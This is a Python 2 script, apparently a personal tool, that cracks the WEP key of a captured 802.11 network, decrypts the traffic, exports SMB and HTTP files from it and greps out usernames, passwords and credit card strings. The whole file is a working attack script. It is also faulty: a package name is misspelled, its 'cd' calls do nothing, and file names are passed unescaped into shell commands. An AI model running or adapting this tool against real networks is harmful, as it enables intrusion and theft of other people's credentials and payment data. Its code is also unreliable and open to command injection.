#!/usr/bin/python
# -------------------------------------------------------------------------------------
#      PYTHON UTILITY FILE TO CRACK ENCRYPTED .PCAP FILES CAPTURED BY WIRESHARK
#
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
#
# -------------------------------------------------------------------------------------

# -------------------------------------------------------------------------------------
#                               LOAD ANY REQUIRED IMPORTS
# -------------------------------------------------------------------------------------

import os
import sys

# -------------------------------------------------------------------------------------
#                               SHOW A UNIVERSAL HEADER
# -------------------------------------------------------------------------------------

print "\nPCAP-CRACKER - SSID AND WEP KEY CRACKER FOR IEEE (802.11) RADIO .PCAP FILES"
print "\n          BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)\n"

# -------------------------------------------------------------------------------------
#                 CONDUCT ROUTINE AND SIMPLE TESTS ON SUPPLIED ARGUEMENTS
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
    print "\nPlease run this python script as root..."
    exit(1)

if len(sys.argv) < 2:
    print "\nUse the command python pcap-cracker.py wiresharkfile.pcap\n"
    exit(1)

filename = sys.argv[1]

if os.path.exists(filename) == 0:
    print "\nFile " + filename + " was not found, did you spell it correctly?"
    exit(1)

# -------------------------------------------------------------------------------------
#             CHECK ALL REQUIRED DEPENDENCIES ARE INSTALLED ON THE SYSTEM.
# -------------------------------------------------------------------------------------

installed = 0

if os.path.isfile('/usr/bin/pcapfix') != 1:
    print "Installing pcapfix...\n"
    os.system("apt-get install pcapfix")
    installed=1

if os.path.isfile("/usr/sbin/airmon-ng") != 1:
    print "Installing aircrack-ng...\n"
    os.system("apt-get install build-essential")
    os.system("apt-get install libssl-dev")
    os.system("apt-get install subversion")
    os.system("apt-get install checkinstall")
    os.system("git clone https://github.com/aircrack-ng/aircrack-ng.git")
    os.system("cd aircrack-ng")
    os.system("make experimental=true")
    os.system("make install")
    os.system("cd..")
    os.system("airodump-ng-oui-update")
    installed=1

if os.path.isfile('/usr/bin/tshark') != 1:
    print "Installing tshark...\n"
    os.system("add-apt-repositorty ppa:dreibh/ppa")
    os.system("apt-get install wireshark")
    os.system("apt-get install tshark")
    installed=1

if installed == 0:
    print "\nAll required dependencies are pre-installed...\n"
else:
    print "\nMissing dependencies have been installed for you...\n"

# -------------------------------------------------------------------------------------
#     SOMETIMES CAPTURED .PCAP FILES GET CUT OFF OR ARE CORRUPTED IN OTHER WAYS
# -------------------------------------------------------------------------------------

os.system("pcapfix -d " + filename + " -o Fixerror.pcap > /dev/null")
if os.path.isfile('./Fixerror.pcap') !=0:
    os.rename(filename, "Oldpcapfile.pcap")
    os.rename("Fixerror.pcap", filename)
    print "\nErrors found in your file have been fixed..."
    print "\nYour orginal file " + filename + " has been renamed Oldpcapfile.pcap."

# -------------------------------------------------------------------------------------
#                       NEXT EXTRACT THE SSID FROM THE .PCAP FILE
# -------------------------------------------------------------------------------------

os.system("tcpdump -ennr " + filename + " '(type mgt subtype beacon)' | awk '{print $13}' | sed 's/[()]//g;s/......//' | sort | uniq > SSID.txt")
print ""
with open('SSID.txt', 'r') as myfile:
  ssid = myfile.read().replace('\n', '')
os.remove('./SSID.txt')
ssid = "00:" + ssid
temp=open("SSID.txt","w")
file.write (temp, ssid)
file.close(temp)

# -------------------------------------------------------------------------------------
#           NOW LETS EXTRACT THE WEP KEY FROM THE .PCAP FILE USING THE SSID
# -------------------------------------------------------------------------------------

os.system("aircrack-ng -b " + ssid + " " + filename + " > Key.txt")
os.system("grep -o '![^\"]*' Key.txt > Key2.txt")
os.system("cat Key2.txt | sed 's/[^a-z  A-Z 0-1 :]//g' > Key3.txt")
os.system("cat Key3.txt | tr -d ' \t\n\r' > WepKey.txt")
os.remove('./Key.txt')
os.remove('./Key2.txt')
os.remove('./Key3.txt')
with open('WepKey.txt', 'r') as myfile:
  wep = myfile.read().replace('\n', '')

# -------------------------------------------------------------------------------------
#           USING THE WEP KEY CREATE A CRACKED VERSION OF THE .PCAP FILE
# -------------------------------------------------------------------------------------

os.system("airdecap-ng -w " + wep + " "+ filename +" " + "> /dev/null")
filename2 = filename[:-5]
filename2 = filename2 + "-dec.pcap"
os.rename(filename2, "Cracked.pcap")

# -------------------------------------------------------------------------------------
#                  NOW CONDUCT SOME RECONISSANCE ON THE CRACKED FILE
# -------------------------------------------------------------------------------------

os.system("tshark -nr Cracked.pcap --export-objects smb,Smbfolder > /dev/null 2>/dev/null")
os.system("tshark -nr Cracked.pcap --export-objects http,Httpfolder > /dev/null 2>/dev/null")
os.system("ngrep -q -I Cracked.pcap | grep -i username > Username.txt")
os.system("ngrep -q -I Cracked.pcap | grep -i password > Password.txt")
os.system("ngrep -q -I Cracked.pcap | grep -i Credit > Creditcard.txt")
os.system("ls -p -I pcap-cracker.py -I " + filename + " -I Httpfolder -I Smbfolder")
exit(0)
#EOF


